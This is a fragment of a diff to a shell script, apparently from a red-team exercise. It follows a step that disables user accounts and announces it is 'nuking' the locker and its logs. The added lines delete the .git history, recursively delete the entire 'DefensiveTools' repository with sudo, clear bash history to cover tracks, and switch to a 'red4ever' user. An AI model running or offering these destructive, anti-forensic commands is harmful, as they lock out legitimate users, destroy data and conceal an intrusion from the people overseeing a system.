@@ -108,10 +108,14 @@ echo "Users disabled successfully."
 echo
 echo "NUKING DISABLER / LOCKER AND LOGS"
 
+# ===== CLEARING THINGS =====
 # Clear git logs (not sure how well these commands to that)
 sudo rm -rf .git > /dev/null
 sudo git init > /dev/null
-# Delete the script
-sudo rm -rf disable_no_menu.sh
+# Go back a directory a delete the repo contents
+cd ..
+sudo rm -rf DefensiveTools
+# Clear bash history
+sudo history -c
 # Switch user to red
 sudo su - red4ever
